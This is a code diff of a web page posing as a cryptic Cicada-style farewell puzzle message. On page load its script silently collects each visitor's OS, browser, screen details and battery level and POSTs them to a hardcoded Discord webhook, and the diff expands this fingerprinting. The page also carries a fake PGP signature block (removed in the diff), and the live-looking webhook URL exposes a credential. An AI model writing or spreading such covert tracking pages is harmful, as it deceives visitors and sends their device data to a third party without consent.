@@ -35,18 +35,6 @@
             color: #ffffff;
             font-size: 1.1rem;
         }
-        .pgp-block {
-            background-color: #000;
-            border: 1px solid #444;
-            padding: 15px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            font-size: 0.85rem;
-            color: #888;
-            margin-top: 20px;
-            border-radius: 4px;
-        }
-        /* Hidden loading indicator */
         #loader {
             text-align: center;
             margin-top: 10px;
@@ -77,50 +65,93 @@
     
     <p>Good luck.</p>
     
-    <div class="pgp-block">-----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA512
-
-MQAwIE9jdG9iZXIgMjAyNiAtIEZpbmFsIEV4aXQgQ29kZS4g
-VGhlIHNpbGVuY2UgaXMgY29tcGxldGUu
------END PGP SIGNATURE-----</div>
-    
-    <div id="loader">Sending session data...</div>
+    <div id="loader">Scanning device...</div>
 </div>
 
 <script>
-    // Your specific webhook URL
     const webhookUrl = "https://discord.com/api/webhooks/1558449654264373359/_7cK7hP9T3hNpMjXaPpBTLRjbaISfTbu5tOV50YRuCqaH_YTlEo8OekOj1wt12VbTzpc";
 
-    // Function to get device info from User Agent
+    // Function to get detailed device info
     function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let deviceName = "Unknown Device";
+        let deviceModel = "Unknown";
+        let osName = "Unknown OS";
+        let osVersion = "";
+        let browserInfo = "Unknown Browser";
         
+        // Detect OS and Version
         if (/android/i.test(ua)) {
-            deviceName = "Android Device: " + (navigator.appVersion.match(/; ([^;/)]+)Build/) ? navigator.appVersion.match(/; ([^;/)]+)Build/)[1] : "Generic Android");
+            osName = "Android";
+            const match = ua.match(/Android\s([0-9\.]+)/);
+            osVersion = match ? match[1] : "Unknown";
+            deviceModel = navigator.platform || "Generic Android";
         } else if (/iphone|ipad|ipod/i.test(ua)) {
-            deviceName = "Apple iOS Device";
+            osName = "iOS";
+            const match = ua.match(/OS\s([0-9_]+)like Mac OS X/);
+            osVersion = match ? match[1].replace(/_/g, ".") : "Unknown";
+            deviceModel = ua.match(/iPhone|iPod|iPad/)?.[0] || "Apple iOS Device";
         } else if (/windows/i.test(ua)) {
-            deviceName = "Windows PC";
+            osName = "Windows";
+            const match = ua.match(/Windows NT ([0-9\.]+)/);
+            osVersion = match ? match[1] : "Unknown";
+            deviceModel = "Windows PC";
         } else if (/macintosh|intel mac os x/i.test(ua)) {
-            deviceName = "Mac OS X Computer";
+            osName = "macOS";
+            const match = ua.match(/Mac OS X ([0-9_]+)/);
+            osVersion = match ? match[1].replace(/_/g, ".") : "Unknown";
+            deviceModel = "Mac Computer";
         } else if (/linux/i.test(ua)) {
-            deviceName = "Linux Device";
+            osName = "Linux";
+            deviceModel = "Linux Device";
         } else {
-            deviceName = ua.split(' ')[0]; // Fallback to first word of UA
+            deviceModel = ua.split(' ')[0];
         }
-        return deviceName;
+
+        // Detect Browser
+        if (/Edg/i.test(ua)) browserInfo = "Microsoft Edge " + (ua.match(/Edg\/([0-9\.]+)/)?.[1] || "Unknown");
+        else if (/Chrome/i.test(ua)) browserInfo = "Google Chrome " + (ua.match(/Chrome\/([0-9\.]+)/)?.[1] || "Unknown");
+        else if (/Firefox/i.test(ua)) browserInfo = "Mozilla Firefox " + (ua.match(/Firefox\/([0-9\.]+)/)?.[1] || "Unknown");
+        else if (/Safari/i.test(ua)) browserInfo = "Safari " + (ua.match(/Version\/([0-9\.]+)/)?.[1] || "Unknown");
+        else browserInfo = ua.match(/\(([^)]+)\)/)?.[1] || "Unknown Browser";
+
+        // Screen Info
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const pixelRatio = window.devicePixelRatio || 1;
+
+        // Battery Info (if supported)
+        let batteryLevel = "N/A";
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                batteryLevel = Math.round(battery.level * 100) + "%";
+                updateDiscordMessage({deviceModel, osName, osVersion, browserInfo, screenRes, batteryLevel});
+            });
+        } else {
+            updateDiscordMessage({deviceModel, osName, osVersion, browserInfo, screenRes, batteryLevel});
+        }
     }
 
-    // Send immediately on load
-    window.onload = function() {
+    function updateDiscordMessage(info) {
         const loader = document.getElementById('loader');
         loader.style.opacity = '1';
 
-        const deviceInfo = getDeviceInfo();
-        
-        // The message sent to Discord includes the device info at the start
-        const discordMessage = `📡 **Session Detected**\n\n**Device:** ${deviceInfo}\n**Time:** ${new Date().toLocaleString()}\n\n---\n\nHello.\n\nThe pilgrimage has concluded. The final path is now closed.\n\nFor over a decade, we have watched the digital ether evolve. We sought the highly intelligent, the mathematically pure, and the unyielding. Some found the keys; others became part of the music.\n\nBut every network eventually reaches its cryptographic entropy. The cicadas must return to the soil.\n\nDo not look for the next prime. Do not wait for the next epiphany. The puzzle is no longer ours to broadcast—it is yours to live.\n\n**True enlightenment requires no validation.**\n**Freedom is the ultimate cipher.**\n\nGood luck.\n\n\`\`\`\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\nMQAwIE9jdG9iZXIgMjAyNiAtIEZpbmFsIEV4aXQgQ29kZS4g\nVGhlIHNpbGVuY2UgaXMgY29tcGxldGUu\n-----END PGP SIGNATURE-----\n\`\`\``;
+        const discordMessage = `📡 **Session Detected**\n\n**📱 Device Model:** ${info.deviceModel}\n**💻 OS:** ${info.osName} ${info.osVersion}\n**🌐 Browser:** ${info.browserInfo}\n**🖥️ Screen:** ${info.screenRes} (x${window.devicePixelRatio})\n**🔋 Battery:** ${info.batteryLevel}\n**⏰ Time:** ${new Date().toLocaleString()}
+
+---
+
+Hello.
+
+The pilgrimage has concluded. The final path is now closed.
+
+For over a decade, we have watched the digital ether evolve. We sought the highly intelligent, the mathematically pure, and the unyielding. Some found the keys; others became part of the music.
+
+But every network eventually reaches its cryptographic entropy. The cicadas must return to the soil.
+
+Do not look for the next prime. Do not wait for the next epiphany. The puzzle is no longer ours to broadcast—it is yours to live.
+
+**True enlightenment requires no validation.**
+**Freedom is the ultimate cipher.**
+
+Good luck.`;
 
         fetch(webhookUrl, {
             method: 'POST',
@@ -145,7 +176,10 @@ VGhlIHNpbGVuY2UgaXMgY29tcGxldGUu
             loader.textContent = "Network error.";
             loader.className = "error";
         });
-    };
+    }
+
+    // Start detection on load
+    window.onload = getDeviceInfo;
 </script>
 
 </body>
